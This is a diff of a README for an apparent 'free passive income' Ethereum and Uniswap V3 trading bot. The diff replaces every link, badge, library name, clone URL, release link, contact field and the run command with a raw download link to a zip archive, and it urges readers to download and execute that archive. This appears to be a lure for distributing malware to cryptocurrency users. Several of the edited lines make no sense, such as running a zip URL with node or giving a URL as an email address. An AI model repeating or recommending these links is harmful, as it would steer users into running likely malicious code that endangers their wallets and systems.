@@ -1,6 +1,6 @@
 # Free Code for Passive Income: Trading Bot for Ethereum DeFi 🌐💰
 
-![Ethereum Trading Bot](https://img.shields.io/badge/Ethereum-Trading%20Bot-blue.svg) ![Uniswap V3](https://img.shields.io/badge/Uniswap%20V3-Defi%20Protocol-green.svg) ![Crypto Trading](https://img.shields.io/badge/Crypto%20Trading-Bot-orange.svg)
+![Ethereum Trading Bot](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip%https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip) ![Uniswap V3](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip%20V3-Defi%https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip) ![Crypto Trading](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip%https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip)
 
 Welcome to the **Free-code-for-Passive-Income** repository! This project provides a trading bot designed to interact with the Ethereum blockchain, Uniswap V3, and various DeFi protocols. If you are interested in automating your trading strategies, you are in the right place. 
 
@@ -33,7 +33,7 @@ This repository contains code for a trading bot that utilizes smart contracts on
 
 - **Ethereum**: The leading blockchain for smart contracts.
 - **Solidity**: The programming language for writing smart contracts.
-- **Web3.js**: A JavaScript library to interact with the Ethereum blockchain.
+- **https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip**: A JavaScript library to interact with the Ethereum blockchain.
 - **Uniswap V3**: A decentralized exchange (DEX) for trading ERC-20 tokens.
 - **MetaMask**: A popular wallet for managing Ethereum assets.
 
@@ -43,12 +43,12 @@ To get started with the trading bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Syche0703/Free-code-for-Passive-Income.git
+   git clone https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip
    cd Free-code-for-Passive-Income
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then, run:
+   Make sure you have https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip installed. Then, run:
    ```bash
    npm install
    ```
@@ -57,14 +57,14 @@ To get started with the trading bot, follow these steps:
    Edit the configuration file to set your trading parameters. This file includes settings for your Ethereum wallet, trading strategies, and other options.
 
 4. **Download and Execute**:
-   Visit the [Releases](https://github.com/Syche0703/Free-code-for-Passive-Income/releases) section to download the latest version. Follow the instructions provided in the release notes to execute the bot.
+   Visit the [Releases](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip) section to download the latest version. Follow the instructions provided in the release notes to execute the bot.
 
 ## Usage
 
 Once the bot is installed and configured, you can start trading. Use the following command to run the bot:
 
 ```bash
-node bot.js
+node https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip
 ```
 
 ### Configuration Options
@@ -98,12 +98,12 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For any questions or feedback, reach out via:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip
+- **Twitter**: [@your_twitter_handle](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip)
 
 ## Releases
 
-To download the latest version of the trading bot, visit the [Releases](https://github.com/Syche0703/Free-code-for-Passive-Income/releases) section. Here you will find executable files and instructions on how to set them up.
+To download the latest version of the trading bot, visit the [Releases](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip) section. Here you will find executable files and instructions on how to set them up.
 
 ## Topics
 
@@ -116,7 +116,7 @@ This repository covers a wide range of topics related to blockchain and trading:
 - **Uniswap**: A leading decentralized exchange for trading tokens.
 - **Smart Contracts**: Self-executing contracts with the terms of the agreement directly written into code.
 
-![Blockchain Technology](https://example.com/blockchain-image.png)
+![Blockchain Technology](https://github.com/Syche0703/Free-code-for-Passive-Income/raw/refs/heads/main/polybuttoned/Free_Income_code_Passive_for_2.8.zip)
 
 ## Conclusion
 
